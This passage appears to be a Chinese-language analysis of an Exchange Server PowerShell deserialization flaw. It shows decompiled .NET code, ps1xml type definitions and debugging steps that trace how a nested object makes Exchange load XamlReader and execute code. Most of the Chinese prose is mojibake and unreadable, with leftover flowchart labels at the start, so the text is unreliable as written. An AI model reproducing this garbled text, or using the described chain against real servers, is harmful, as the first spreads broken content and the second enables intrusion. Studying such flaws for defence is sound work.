‡ç­¾\rReadOneDeserializedObjectéå†XMLæ ‘çš„æ ‡ç­¾\tåŠ¨æ€è¿æ¥çº¿\rè°ƒç”¨è¯»å–ä¸€ä¸ªååºåˆ—åŒ–å¯¹è±¡ object obj = this.ReadOneDeserializedObject\rè°ƒç”¨ï¼Œè¯»å–ä¸€ä¸ªååºåˆ—åŒ–å¯¹è±¡object obj = this.ReadOneDeserializedObject\tåŠ¨æ€è¿æ¥çº¿.12\rç¢°åˆ°Objæ ‡ç­¾è°ƒç”¨è¯»å–ä¸€ä¸ªObjå¯¹è±¡ if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){ return thi...\rç¢°åˆ°Objæ ‡ç­¾ï¼Œè°ƒç”¨ï¼Œè¯»å–ä¸€ä¸ªObjå¯¹è±¡if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){return this.ReadPSObject();}\tæµç¨‹.11\rReadPSObject è¯»å–ä¸€ä¸ªObjå¯¹è±¡\rReadPSObjectè¯»å–ä¸€ä¸ªObjå¯¹è±¡\tåŠ¨æ€è¿æ¥çº¿.14\rç¢°åˆ°Propsæ ‡ç­¾è°ƒç”¨è¯»å–Propsæ ‡ç­¾ if (this.IsNextElement(\u0026#34;Props\u0026#34;)){ this.R...\rç¢°åˆ°Propsæ ‡ç­¾ï¼Œè°ƒç”¨ï¼Œè¯»å–Propsæ ‡ç­¾if (this.IsNextElement(\u0026#34;Props\u0026#34;)){this.ReadProperties(psobject);}\tæµç¨‹.13\rReadProperties\rReadProperties\tåŠ¨æ€è¿æ¥çº¿.16\rè°ƒç”¨è¯»å–åµŒå¥—å¯¹è±¡\rè°ƒç”¨ï¼Œè¯»å–åµŒå¥—å¯¹è±¡\tæµç¨‹.15\rReadOneObject\rReadOneObject\tåŠ¨æ€è¿æ¥çº¿.20\rè°ƒç”¨å°†ååºåˆ—åŒ–æ•°æ® è½¬æ¢ä¸ºç›®æ ‡ç±»å‹æ­¤æ—¶ç›®æ ‡ç±»å‹ä¸ºSystem.Exception\rè°ƒç”¨ï¼Œå°†ååºåˆ—åŒ–æ•°æ®è½¬æ¢ä¸ºç›®æ ‡ç±»å‹ï¼Œæ­¤æ—¶ç›®æ ‡ç±»å‹ä¸ºSystem.Exception\tæµç¨‹.19\rConvertTo\rConvertTo\tåŠ¨æ€è¿æ¥çº¿.22\rä¸€ç³»åˆ—è°ƒç”¨\rä¸€ç³»åˆ—è°ƒç”¨\tæµç¨‹.21\rObject.Reader.Deserialize\rObject.Reader.Deserialize\tåŠ¨æ€è¿æ¥çº¿.24\rè°ƒç”¨è§£æå†…å­˜ä¸­çš„åºåˆ—åŒ–æ•°æ®\rè°ƒç”¨ï¼Œè§£æå†…å­˜ä¸­çš„åºåˆ—åŒ–æ•°æ®\tæµç¨‹.23\r__BinaryParser.Run\r__BinaryParser.Run\tåŠ¨æ€è¿æ¥çº¿.28\ræµç¨‹.27\rå°†åºåˆ—åŒ–æ•°æ®è§£æä¸ºSystem.UnitySerializationHolderå¯¹è±¡å¹¶è½½å…¥m_assmblyNameå¯¹åº”çš„...\rå°†åºåˆ—åŒ–æ•°æ®è§£æä¸ºSystem.UnitySerializationHolderå¯¹è±¡ï¼Œå¹¶è½½å…¥m_assmblyNameå¯¹åº”çš„DLL\tåŠ¨æ€è¿æ¥çº¿.39\ræµç¨‹.38\rè½¬åŒ–ä¸ºåœ¨m_assmblyNameå¯¹åº”çš„DLLä¸­çš„m_dataå¯¹åº”ç±»å‹çš„Typeå¯¹è±¡\rè½¬åŒ–ä¸ºåœ¨m_assmblyNameå¯¹åº”çš„DLLä¸­çš„m_dataå¯¹åº”ç±»å‹çš„Typeå¯¹è±¡\tåŠ¨æ€è¿æ¥çº¿.41\rä¸€ç³»åˆ—è¿”å›\rä¸€ç³»åˆ—è¿”å›\tåŠ¨æ€è¿æ¥çº¿.43\ræµç¨‹.42\rå°†ConverToè¿”å›çš„Typeå¯¹è±¡åŠ å…¥.adaptedMembers\rå°†ConverToè¿”å›çš„Typeå¯¹è±¡åŠ å…¥.adaptedMembers\tæµç¨‹.45\rGetTargetTypeForDeserialization\rGetTargetTypeForDeserialization\tæµç¨‹.53\rReadOneDeserializedObject\rReadOneDeserializedObject\tæµç¨‹.54\rReadOneObject\rReadOneObject\tåŠ¨æ€è¿æ¥çº¿.56\råŠ¨æ€è¿æ¥çº¿.57\råŠ¨æ€è¿æ¥çº¿.58\råŠ¨æ€è¿æ¥çº¿.59\rè°ƒç”¨\rè°ƒç”¨\tåŠ¨æ€è¿æ¥çº¿.61\ræµç¨‹.60\rGetPSStandardMember\rGetPSStandardMember\tåŠ¨æ€è¿æ¥çº¿.63\ræµç¨‹.62\rè¯»å–adaptedMembersçš„TargetTypeForDeserializationå¹¶è¿”å›\rè¯»å–adaptedMembersçš„TargetTypeForDeserializationå¹¶è¿”å›\tåŠ¨æ€è¿æ¥çº¿.66\rè°ƒç”¨å°†å¤–å±‚å¯¹è±¡åºåˆ—åŒ–æ•°æ®\rè°ƒç”¨ï¼Œå°†å¤–å±‚å¯¹è±¡åºåˆ—åŒ–æ•°æ®\tæµç¨‹.65\rLanguagePrimitives.ConvertTo\rLanguagePrimitives.ConvertTo\tåŠ¨æ€è¿æ¥çº¿.69\ræµç¨‹.68\rå°†Sæ ‡ç­¾å†…æ•°æ®è½¬æ¢ä¸ºXamlReaderå¯¹è±¡è§¦å‘ä»£ç æ‰§è¡Œ\rå°†Sæ ‡ç­¾å†…æ•°æ®è½¬æ¢ä¸ºXamlReaderå¯¹è±¡ï¼Œè§¦å‘ä»£ç æ‰§è¡Œ\tåœ¨Exchangeä¸­ï¼Œå…è®¸ååºåˆ—åŒ–çš„ç±»ç™½åå•å’Œç±»ååºåˆ—åŒ–ç›¸å…³ä¿¡æ¯å®šä¹‰åœ¨exchange.partial.types.ps1xmlå’Œexchange.types.ps1xmlç­‰æ–‡ä»¶ä¸­ï¼ŒExchangeä¼šè¯»å–è¿™äº›æ–‡ä»¶ï¼Œåœ¨ååºåˆ—åŒ–æ•°æ®æ—¶ï¼Œä¼špayloadé‡Œé¢çš„ç›®æ ‡ç±»å’Œæ–‡ä»¶é‡Œé¢çš„ç™½åå•ç±»åšå¯¹æ¯”ï¼Œåªæœ‰åœ¨ç™½åå•å†…çš„ç±»æ‰å…è®¸ååºåˆ—åŒ–ã€‚\nPoCç”±åµŒå¥—å¯¹è±¡ç»„æˆï¼Œåœ¨ååºåˆ—åŒ–åµŒå¥—å¯¹è±¡æ—¶ï¼Œä¼šå…ˆååºåˆ—åŒ–é‡Œå±‚å¯¹è±¡ï¼Œè€Œåååºåˆ—åŒ–å¤–å±‚å¯¹è±¡ã€‚åœ¨Exchangååºåˆ—åŒ–PoCçš„é‡Œå±‚å¯¹è±¡æ—¶ï¼Œå°†é€šè¿‡ConvertToå‡½æ•°è½¬æ¢åˆ°ç›®æ ‡ç±»ï¼Œä¼ ç»™ConvertToçš„resultTypeå€¼ä¸ºSystem.Exceptionï¼ŒSystem.Exceptionåœ¨exchange.partial.types.ps1xmlä¸­å®šä¹‰å¦‚ä¸‹ï¼š\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.Exception\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;CodeProperty IsHidden=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;Name\u0026gt;SerializationData\u0026lt;/Name\u0026gt; \u0026lt;GetCodeReference\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;MethodName\u0026gt;GetSerializationData\u0026lt;/MethodName\u0026gt; \u0026lt;/GetCodeReference\u0026gt; \u0026lt;/CodeProperty\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;TypeConverter\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;/TypeConverter\u0026gt; \u0026lt;/Type\u0026gt; internal static object ConvertTo(object valueToConvert, Type resultType, bool recursion, IFormatProvider formatProvider, TypeTable backupTypeTable) { object result; using (LanguagePrimitives.typeConversion.TraceScope(\u0026#34;Converting \\\u0026#34;{0}\\\u0026#34; to \\\u0026#34;{1}\\\u0026#34;.\u0026#34;, valueToConvert, resultType)) { if (resultType == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;resultType\u0026#34;); } bool flag; result = LanguagePrimitives.FigureConversion(valueToConvert, resultType, out flag).Invoke(flag ? PSObject.Base(valueToConvert) : valueToConvert, resultType, recursion, flag ? ((PSObject)valueToConvert) : null, formatProvider, backupTypeTable); } return result; } å…¶å®šä¹‰äº†*\u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt;ï¼ŒExchangeå°†é€šè¿‡Microsoft.Exchange.Data.SerializationTypeConverter*ç±»å¯¹é‡Œå±‚åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–ã€‚Microsoft.Exchange.Data.SerializationTypeConverterç»è¿‡ä¸€ç³»åˆ—è°ƒç”¨ï¼Œæœ€ç»ˆç”±System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚\nåœ¨è¯¥æ–¹æ³•ä¼šè°ƒç”¨System.Runtime.Serialization.Formatters.Binary.__BinaryParser.Runï¼Œè¿™æ–¹æ³•ä¼šå¾ªç¯è¯»å–å†…å­˜ä¸­çš„é‡Œå±‚å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ï¼Œå°†å…¶è½¬æ¢ä¸ºSystem.UnitySerializationHolderå¯¹è±¡ã€‚\nä¹‹åExchangeä¼šé€šè¿‡Assembly.LoadFromè½½å…¥*System.UnitySerializationHolder.m_assemblyNameæ‰€æŒ‡æ˜çš„DLLï¼Œå¹¶ä¸”è¿”å›System.UnitySerializationHolder.m_data*ç±»å‹çš„Typeå¯¹è±¡ã€‚\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ...... serParser.Run(); ...... if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } åœ¨ä¸€ç³»åˆ—å‡½æ•°è°ƒç”¨è¿”å›åï¼ŒSystem.Management.Automation.InternalDeserializer.ReadPropertiesä¼šå°†System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeè¿”å›çš„å¯¹è±¡æ·»åŠ åˆ°PSObject.adaptedMembersä¸­ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥å¯¹è±¡å˜é‡åä¸ºTargetTypeForDeserializationã€‚\nprivate void ReadProperties(PSObject dso) { dso.isDeserialized = true; dso.adaptedMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); dso.InstanceMembers.Add(PSObject.dotNetInstanceAdapter.GetDotNetMethod\u0026lt;PSMemberInfo\u0026gt;(dso, \u0026#34;GetType\u0026#34;)); PSGetMemberBinder.SetHasInstanceMember(\u0026#34;GetType\u0026#34;); dso.clrMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); if (this.ReadStartElementAndHandleEmpty(\u0026#34;Props\u0026#34;)) { while (this._reader.NodeType == XmlNodeType.Element) { string name = this.ReadNameAttribute(); object serializedValue = this.ReadOneObject(); PSProperty member = new PSProperty(name, serializedValue); dso.adaptedMembers.Add(member); } this.ReadEndElement(); } } åœ¨ååºåˆ—åŒ–å¤–å±‚å¯¹è±¡æ—¶ï¼ŒReadOneObjectä¼šè°ƒç”¨GetTargetTypeForDeserializationè·å–ååºåˆ—åŒ–çš„ç›®æ ‡ç±»å‹ï¼Œå¹¶é€šè¿‡ConvertToè½¬åŒ–ä¸ºè¯¥å¯¹è±¡ã€‚\nåœ¨GetTargetTypeForDeserializationå‡½æ•°ä¸­ï¼Œå°†ä¼šè°ƒç”¨GetPSStandardMemberå¹¶ä¼ å…¥ç¡¬ç¼–ç çš„TargetTypeForDeserializationï¼Œåœ¨GetPSStandardMemberä¸­ä¼šé€šè¿‡TypeTableGetMemberDelegateåˆ›å»ºæˆå‘˜é›†åˆï¼Œå…¶ä¸­åŒ…æ‹¬å­ç±»çš„æˆå‘˜å±æ€§ï¼Œè€ŒååŒ¹é…å…¶ä¸­çš„memberNameé¡¹å¯¹åº”çš„å€¼å¹¶è¿”å›ã€‚æ­¤æ—¶è·å–çš„å€¼ä¸ºXamlReaderç±»å‹çš„Typeå¯¹è±¡ã€‚\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } internal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } å¤–å±‚ç±»ç±»å‹å®šä¹‰ä¸ºSystem.ServiceProcess.ServiceControllerï¼Œå…¶å®šä¹‰åœ¨types.ps1xmlæ–‡ä»¶å†…ï¼Œå®šä¹‰å¦‚ä¸‹ã€‚\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;MemberSet\u0026gt; \u0026lt;Name\u0026gt;PSStandardMembers\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;PropertySet\u0026gt; \u0026lt;Name\u0026gt;DefaultDisplayPropertySet\u0026lt;/Name\u0026gt; \u0026lt;ReferencedProperties\u0026gt; \u0026lt;Name\u0026gt;Status\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;DisplayName\u0026lt;/Name\u0026gt; \u0026lt;/ReferencedProperties\u0026gt; \u0026lt;/PropertySet\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/MemberSet\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServiceName\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;RequiredServices\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServicesDependedOn\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;ScriptMethod\u0026gt; \u0026lt;Name\u0026gt;ToString\u0026lt;/Name\u0026gt; \u0026lt;Script\u0026gt; $this.ServiceName \u0026lt;/Script\u0026gt; \u0026lt;/ScriptMethod\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/Type\u0026gt; åœ¨GetPSStandardMemberå‡½æ•°ä¼šè¯•å›¾è·å–System.ServiceProcess.ServiceControllerç±»çš„TargetTypeForDeserializationï¼ˆä¼ å…¥çš„ç¡¬ç¼–ç å‚æ•°ï¼‰å±æ€§ï¼Œä½†å…¶åœ¨æ–‡ä»¶å†…æ²¡æœ‰å®šä¹‰é»˜è®¤çš„TargetTypeForDeserializationå€¼ï¼Œæ‰€ä»¥å¤–å±‚ç±»çš„memberså†…æ²¡æœ‰TargetTypeForDeserializationåå­—çš„å€¼ï¼ŒExchangeå°†è¯•å›¾ä»å­ç±»çš„memberså±æ€§ä¸­æ£€ç´¢TargetTypeForDeserializationåå­—çš„å€¼ï¼Œå‰é¢è¯´è¿‡åœ¨å¯¹å†…å±‚å¯¹è±¡ååºåˆ—åŒ–æ—¶ï¼Œé€šè¿‡ReadPropertieså°†åä¸ºTargetTypeForDeserializationçš„XamlReaderç±»å‹çš„Typeå¯¹è±¡æ·»åŠ åˆ°äº†adaptedMembersä¸­ï¼Œæ­¤æ—¶Exchangeå°†ä¼šæ£€ç´¢åˆ°è¯¥å¯¹è±¡å¹¶è¿”å›ã€‚\nè·å–åˆ°targetTypeForDeserializationä¹‹åï¼ŒReadOneObjectè°ƒç”¨LanguagePrimitives.ConvertToå°†åºåˆ—åŒ–æ•°æ®è½¬æ¢ä¸ºtargetTypeForDeserialization(XamlReader)ã€‚\ninternal object ReadOneObject(out string streamName) { .... object obj = this.ReadOneDeserializedObject(out streamName, out flag); ..... Type targetTypeForDeserialization = psobject.GetTargetTypeForDeserialization(this._typeTable); .... object obj2 = LanguagePrimitives.ConvertTo(obj, targetTypeForDeserialization, true, CultureInfo.InvariantCulture, this._typeTable); ..... } ConvertToå‡½æ•°ä¼šè¿›è¡Œå¦‚ä¸‹è°ƒç”¨é“¾ï¼Œé€šè¿‡åå°„è·å–åˆ°XamlReaderç±»çš„Parseæ–¹æ³•åï¼Œå°†å…¶è°ƒç”¨ï¼ŒæˆåŠŸæ‰§è¡Œä»£ç ã€‚\nè°ƒè¯• ä½¿ç”¨dnsPyé™„åŠ åˆ°ä¸‹é¢çš„è¿›ç¨‹\nc:\\windows\\system32\\inetsrv\\w3wp.exe -ap \u0026#34;MSExchangePowerShellAppPool\u0026#34; -v \u0026#34;v4.0\u0026#34; -c \u0026#34;C:\\Program Files\\Microsoft\\Exchange Server\\V15\\bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\u0026#34; -a \\\\.\\pipe\\iisipm319caf0c-5de0-4833-8a04-4b28f4a836ae -h \u0026#34;C:\\inetpub\\temp\\apppools\\MSExchangePowerShellAppPool\\MSExchangePowerShellAppPool.config\u0026#34; -w \u0026#34;\u0026#34; -m 0 åœ¨ä»¥ä¸‹å‡ ä¸ªåœ°æ–¹ä¸‹æ–­ç‚¹\nSystem.Runtime.Serialization.Formatters.Binary ObjectReader.Deserialize å‘é€PoCï¼Œè°ƒè¯•å™¨åœ¨æ–­ç‚¹å¤„æ–­ä¸‹ï¼Œæ­¤æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹:\næ­¤æ—¶ä¸ºExchangeè¯•å›¾å°†Propsæ ‡ç­¾å†…çš„åºåˆ—åŒ–æ•°æ®é€šè¿‡ConvertToå‡½æ•°è½¬åŒ–ä¸ºSystem.Exceptionå¯¹è±¡ï¼ŒSystem.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeä¼šé€šè¿‡serParser.Run()è§£æè¯»å…¥å†…å­˜ä¸­çš„base64è§£ç æ•°æ®ã€‚\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ..... serParser.Run(); if (this.bFullDeserialization) { this.m_objectManager.DoFixups(); } if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } serParser.Run()ä¼šå°†å†…å­˜åºåˆ—åŒ–æ•°æ®è¯•å›¾è½¬åŒ–ä¸ºSystem.UnitySerializationHolder å¯¹è±¡ï¼Œä»£ç å¦‚ä¸‹ï¼Œé€šè¿‡å¾ªç¯è¯»å–å„ä¸ªæ ‡å¿—ä½è°ƒç”¨ä¸åŒæ–¹æ³•ä»å†…å­˜ä¸­è¯»å–æŒ‡å®šç±»å‹çš„æ•°æ®ã€‚æ„é€ å‡ºSystem.UnitySerializationHolderå¯¹è±¡å¹¶è½½å…¥System.UnitySerializationHolder.AssemblyNameå¯¹åº”çš„DLLã€‚\ninternal void Run() { try { bool flag = true; this.ReadBegin(); this.ReadSerializationHeaderRecord(); while (flag) { BinaryHeaderEnum binaryHeaderEnum = BinaryHeaderEnum.Object; BinaryTypeEnum binaryTypeEnum = this.expectedType; if (binaryTypeEnum != BinaryTypeEnum.Primitive) { if (binaryTypeEnum - BinaryTypeEnum.String \u0026gt; 6) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TypeExpected\u0026#34;)); } byte b = this.dataReader.ReadByte(); binaryHeaderEnum = (BinaryHeaderEnum)b; switch (binaryHeaderEnum) { case BinaryHeaderEnum.Object: this.ReadObject(); break; case BinaryHeaderEnum.ObjectWithMap: ..... this.ReadObjectWithMap(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectWithMapTyped: ...... this.ReadObjectWithMapTyped(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectString: ...... this.ReadObjectString(binaryHeaderEnum); break; case BinaryHea......flag2) { ObjectProgress objectProgress = (ObjectProgress)this.stack.Peek(); if (objectProgress == null) { this.expectedType = BinaryTypeEnum.ObjectUrt; this.expectedTypeInformation = null; flag2 = true; } else { flag2 = objectProgress.GetNext(out objectProgress.expectedType, out objectProgress.expectedTypeInformation); this.expectedType = objectProgress.expectedType; this.expectedTypeInformation = objectProgress.expectedTypeInformation; if (!flag2) { this.prs.Init(); if (objectProgress.memberValueEnum == InternalMemberValueE.Nested) { this.prs.PRparseTypeEnum = InternalParseTypeE.MemberEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } else { this.prs.PRparseTypeEnum = InternalParseTypeE.ObjectEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } this.stack.Pop(); this.PutOp(objectProgress); } } } } } } ...... } å°†XamlReaderè¯»å…¥å†…å­˜\nåœ¨System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeä¸­å°†é€šè¿‡\nthis.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); å°†System.UnitySerializationHolderè½¬åŒ–ä¸ºTypeç±»å‹çš„XamlReaderå¯¹è±¡ï¼Œå¹¶é€šè¿‡åå°„è·å–äº†XamlReaderç±»çš„å„ä¸ªå±æ€§ã€‚\nåœ¨æœ€åå°†this.TopObjectä½œä¸ºè¿”å›å€¼è¿”å›ï¼Œåœ¨ç»è¿‡ä¸€ç³»åˆ—å‡½æ•°è°ƒç”¨è¿”å›åï¼Œå¯ä»¥åœ¨è°ƒè¯•å™¨çœ‹åˆ°ConvertToå‡½æ•°è¿”å›äº†Objectç±»å‹å¯¹è±¡obj2ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸ºç±»å‹ä¸ºTypeç±»å‹çš„XamlReaderå¯¹è±¡ï¼Œä¹‹åReadOneObjectè¿”å›è¯¥å¯¹è±¡ã€‚\næ³¨ï¼šTypeç±»å‹æ˜¯Exchangeå†…å®šä¹‰çš„æŠ½è±¡ç±»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\nnamespace System { // Token: 0x02000148 RID: 328 [ClassInterface(ClassInterfaceType.None)] [ComDefaultInterface(typeof(_Type))] [ComVisible(true)] [__DynamicallyInvokable] [Serializable] public abstract class Type : MemberInfo, _Type, IReflect { // Token: 0x17000217 RID: 535 // (get) Token: 0x060013E6 RID: 5094 RVA: 0x0003BE2A File Offset: 0x0003A02A public override MemberTypes MemberType { get { return MemberTypes.TypeInfo; } } (åº”è¯¥å¯ä»¥ç†è§£obj2ä¸ºå®ç°äº†Typeè¿™ä¸ªæŠ½è±¡ç±»çš„XamlReaderå¯¹è±¡ï¼Œè€ŒXamlReaderç»§æ‰¿äº†Objectè¿™ä¸ªçˆ¶ç±»ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨Objectç±»å‹å¯¹è±¡æ¥å—)\nåœ¨è°ƒç”¨æ ˆå†…ï¼ŒReadOneObjectç”±ReadPropertiesè°ƒç”¨ï¼Œå›åˆ°ReadPropertiesé€»è¾‘ä¸­ï¼ŒExchangeä¼šå°†ReadOneObjectè¿”å›çš„çš„Typeç±»å‹çš„XamlReaderå¯¹è±¡æ·»åŠ åˆ°dso.adaptedMembersä¸­ï¼Œè€Œåè¿™ä¸ªdsoå°†ä¼šè¿”å›åˆ°è°ƒç”¨æ ˆå†…çš„ReadOneObjectå‡½æ•°ã€‚\nç»§ç»­è°ƒè¯•ï¼Œæ­¤æ—¶åµŒå¥—å¯¹è±¡çš„å†…å±‚å¯¹è±¡å·²ååºåˆ—åŒ–ï¼Œå¼€å§‹ååºåˆ—åŒ–å¤–å±‚å¯¹è±¡ï¼Œå›åˆ°ç¨‹åºä¸­ï¼Œä»ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œå°†ä¼šè°ƒç”¨psobject.GetTargetTypeForDeserializationè·å–ç›®æ ‡ååºåˆ—åŒ–ç±»å‹ï¼Œæ­¤æ—¶psobjectå†…çš„adaptedMemberså†…æœ‰åä¸ºTargetTypeForDeserializationçš„å¯¹è±¡ï¼Œå…¶ç±»å‹ä¸ºTypeçš„XamlReaderå¯¹è±¡\nè¿›å…¥åˆ°psobject.GetTargetTypeForDeserializationå†…ï¼Œè°ƒç”¨this.GetPSStandardMemberè¯•å›¾è·å–PSMemberInfo å¯¹è±¡ï¼Œè€Œåå°†å…¶å¼ºè½¬ä¸ºTypeå¯¹è±¡è¿”å›ï¼Œè‹¥å¤±è´¥åˆ™è¿”å›null\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } åœ¨GetPSStandardMemberå‡½æ•°å†…ï¼Œè°ƒç”¨PSObject.TypeTableGetMemberDelegateå¹¶ä¼ å…¥å½“å‰å¯¹è±¡ã€å…è®¸çš„ç±»å‹åˆ—è¡¨å’Œç¡¬ç¼–ç PSStandardMembersä»¥åˆå§‹åŒ–PSMemberSet å¯¹è±¡ã€‚\ninternal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } è€Œåè°ƒç”¨PSMemberInfoIntegratingCollectionæ„é€ å‡½æ•°ï¼Œå…¶ä¸­PSMemberInfoIntegratingCollectionç±»ç»§æ‰¿äº†PSMemberInfoç±»ã€‚ä¼ å…¥æ„é€ å‡½æ•°çš„collectionså˜é‡æ¥æºäºPSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable) å‡½æ•°çš„è¿”å›å€¼ï¼Œæ„é€ å‡½æ•°å°†collectionsèµ‹ç»™å½“å‰å¯¹è±¡çš„collectionså±æ€§ã€‚\ninternal class PSMemberInfoIntegratingCollection\u0026lt;T\u0026gt; : PSMemberInfoCollection\u0026lt;T\u0026gt;, IEnumerable\u0026lt;T\u0026gt;, IEnumerable where T : PSMemberInfo { // Token: 0x06002AC3 RID: 10947 RVA: 0x000C35F4 File Offset: 0x000C17F4 private void GenerateAllReservedMembers() { if (!this.mshOwner.hasGeneratedReservedMembers) { this.mshOwner.hasGeneratedReservedMembers = true; ReservedNameMembers.GeneratePSExtendedMemberSet(this.mshOwner); 